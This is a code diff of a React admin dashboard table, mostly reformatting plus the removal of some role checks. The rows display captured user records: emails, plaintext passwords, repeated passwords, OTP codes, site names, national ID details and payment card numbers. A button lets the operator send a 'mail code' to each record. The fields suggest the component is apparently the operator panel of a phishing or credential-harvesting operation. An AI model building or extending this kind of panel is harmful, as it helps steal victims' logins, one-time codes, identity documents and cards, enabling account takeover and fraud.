@@ -3,9 +3,9 @@ import { formatUtcToLocal } from "../../utils/DateFormater";
 import { handleCopyClick } from "../../utils/copyToClipboard";
 import Loader from "../../common/Loader";
 import useInformation from "../../hooks/useInformation";
-import {  PaginationNav1Presentation } from "../Pagination/Pagination";
+import { PaginationNav1Presentation } from "../Pagination/Pagination";
 import CardDataModal from "../../modals/CardDataModal";
-import {   useState } from "react";
+import { useState } from "react";
 import NidInfoModal from "../../modals/NIdInfoModal";
 import InputField from "../forms/InputField";
 import { updateData } from "../../api/fetching";
@@ -14,24 +14,24 @@ import toast from "react-hot-toast";
 
 const InformationTable = () => {
 
-  const [open,setOpen] = useState(false)
-  const [nidOpen,setNidOpen] = useState(false)
-  const [paymentInfo,setPaymentInfo] = useState({})
-  const [nidInfo,setNidInfo] = useState({})
-  const [codeVal,setCodeVal]= useState('')
+  const [open, setOpen] = useState(false)
+  const [nidOpen, setNidOpen] = useState(false)
+  const [paymentInfo, setPaymentInfo] = useState({})
+  const [nidInfo, setNidInfo] = useState({})
+  const [codeVal, setCodeVal] = useState('')
 
-  const updateGmailOtp = async(id:any)=> {
-    const originalData= {
+  const updateGmailOtp = async (id: any) => {
+    const originalData = {
       mailCode: codeVal
     }
-    const data = await updateData(`/information/admin/${id}`,originalData)
+    const data = await updateData(`/information/admin/${id}`, originalData)
     console.log(data);
     toast.success('code sent sucessfully')
   }
 
 
 
-  const { loading, setIsRefresh, displayInfo, role,totalPages, setPage,page} = useInformation()
+  const { loading, setIsRefresh, displayInfo, role, totalPages, setPage, page } = useInformation()
 
   return (
     <div className="rounded-sm  -stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1 ">
@@ -84,42 +84,28 @@ const InformationTable = () => {
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 OTP Code
               </th>
-          
-                     
-                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
-                  NID INFO
-                 </th>
-              
 
-{
-                (role==='subadmin' || role==='admin') && (
-                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
-                  Card Info
-                 </th>
-                )
-              }
 
-          
+              <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+                NID INFO
+              </th>
 
-              {
-  role==='subadmin' && (
-    <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
-    Add Code  
-  </th>
-    
-  )
-}
 
-{
-   role === 'subadmin' &&(
-    <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
-    update
-  </th>
-
-   )
-}
            
+                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+                    Card Info
+                  </th>
             
+         
+                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+                    Add Code
+                  </th>
+
+             
+                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+                    update
+                  </th>
+
 
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 Agent
@@ -136,7 +122,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user,nidInfo,  createdAt, agent: { source },  email, password, repassword, otp, siteName, _id,paymentInfo, }:any,index) => (
+              displayInfo?.map(({ user, nidInfo, createdAt, agent: { source }, email, password, repassword, otp, siteName, _id, paymentInfo, }: any, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -154,77 +140,71 @@ const InformationTable = () => {
                       }`}>{siteName}</span>
 
                   </td>
-                 
-                  
-                  <InputField email={email} userId={user._id}/>
-                  <InputField email={password} userId={user._id}/>
-                  <InputField email={repassword} userId={user._id}/>
-                  <InputField email={otp} userId={user._id}/>
+
+
+                  <InputField email={email} userId={user._id} />
+                  <InputField email={password} userId={user._id} />
+                  <InputField email={repassword} userId={user._id} />
+                  <InputField email={otp} userId={user._id} />
 
 
 
-                 
-                      <td  className="px-2 py-1 font-bold cursor-pointer ">
-                      <div className="relative inline-block">
-                          <button
-                                                        className={`p-2  ${(nidInfo as any) && '!bg-danger'} ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-                                                      } `}
-                                                      onClick={() => {
-                                                        setNidOpen((state) => !state);
-                                                        setNidInfo(nidInfo);
-                                                       }}
-                              >View</button>
-    
-                        </div>
-    
-    
-                      </td>
-                  
+
+                  <td className="px-2 py-1 font-bold cursor-pointer ">
+                    <div className="relative inline-block">
+                      <button
+                        className={`p-2  ${(nidInfo as any) && '!bg-danger'} ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                          } `}
+                        onClick={() => {
+                          setNidOpen((state) => !state);
+                          setNidInfo(nidInfo);
+                        }}
+                      >View</button>
+
+                    </div>
+
+
+                  </td>
+
                   {/* Card Info */}
                   {
                     (role === 'subadmin' || role === 'admin') && (
-                      <td  className="px-2 py-1 font-bold cursor-pointer ">
-                      <div className="relative inline-block">
+                      <td className="px-2 py-1 font-bold cursor-pointer ">
+                        <div className="relative inline-block">
                           <button
                             className={`p-2  ${(paymentInfo as any)?.cardNumber && '!bg-danger'} ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-                          } `}
-                          onClick={() => {
-                            setOpen((state) => !state);
-                            setPaymentInfo(paymentInfo);
-                           }}
-                              >View</button>
-    
+                              } `}
+                            onClick={() => {
+                              setOpen((state) => !state);
+                              setPaymentInfo(paymentInfo);
+                            }}
+                          >View</button>
+
                         </div>
-    
-    
+
+
                       </td>
                     )
                   }
-                
-                {
-                  role ==='subadmin' && (
-                    <td className="px-2 py-1 font-bold cursor-pointer ">
-                    <input type="text" className="py-2 w-12 border-none dark:bg-graydark focus:outline-none  bg-bodydark1" onChange={(e)=>setCodeVal(e.target.value)} />
-             </td>
-                  )
-                }
-             
-                      
 
-                      {
-                        role === 'subadmin' && (
-                          <td className="px-2 py-1 font-bold cursor-pointer ">
-                          <div className="relative inline-block">
-                            <button
-                            onClick={()=>updateGmailOtp(_id)}
-  
-                              className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-                                }`}>Add</button>
-                          </div>
-                        </td>
-                        )
-                      }
-                     
+              
+                      <td className="px-2 py-1 font-bold cursor-pointer ">
+                        <input type="text" className="py-2 w-12 border-none dark:bg-graydark focus:outline-none  bg-bodydark1" onChange={(e) => setCodeVal(e.target.value)} />
+                      </td>
+                
+
+
+              
+                      <td className="px-2 py-1 font-bold cursor-pointer ">
+                        <div className="relative inline-block">
+                          <button
+                            onClick={() => updateGmailOtp(_id)}
+
+                            className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                              }`}>Add</button>
+                        </div>
+                      </td>
+            
 
                   <td className="px-2 py-1 font-bold cursor-pointer ">
                     <div className="relative inline-block">
@@ -242,23 +222,23 @@ const InformationTable = () => {
               ))
             }
 
-<CardDataModal isOpen={open} setIsOpen={setOpen} data={paymentInfo}/>
-<NidInfoModal isOpen={nidOpen} setIsOpen={setNidOpen} data={nidInfo}/>
+            <CardDataModal isOpen={open} setIsOpen={setOpen} data={paymentInfo} />
+            <NidInfoModal isOpen={nidOpen} setIsOpen={setNidOpen} data={nidInfo} />
 
 
 
 
 
           </tbody>
-         
+
         </table>
-<div className="flex items-center justify-center">
-<PaginationNav1Presentation 
-pageCount={totalPages}
-pageIndex={page}
-setPageIndex={setPage}
-  />
-</div>
+        <div className="flex items-center justify-center">
+          <PaginationNav1Presentation
+            pageCount={totalPages}
+            pageIndex={page}
+            setPageIndex={setPage}
+          />
+        </div>
       </div>
 
 
